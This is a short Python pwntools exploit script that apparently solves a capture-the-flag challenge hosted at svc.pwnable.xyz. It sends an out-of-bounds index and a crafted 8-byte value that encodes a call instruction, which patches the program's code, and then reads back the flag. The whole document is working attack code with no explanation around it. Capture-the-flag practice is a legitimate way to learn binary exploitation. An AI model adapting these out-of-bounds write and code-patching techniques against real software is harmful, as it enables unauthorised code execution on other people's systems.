from pwn import *
context.log_level = "debug"

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30029)

# gdb.attach(p)
addr = -(0x202200-0x830)/8
sc = '\xe8\xec\x01\x00\x00\x90\x00\x00'
num = u64(sc)
num1 = num ^ 1
p.recvuntil('>')
p.sendline(str(num1) + ' 1 ' + str(addr))
addr += 8
p.recvuntil('>')
p.sendline('0 0 0')
p.recvuntil('}')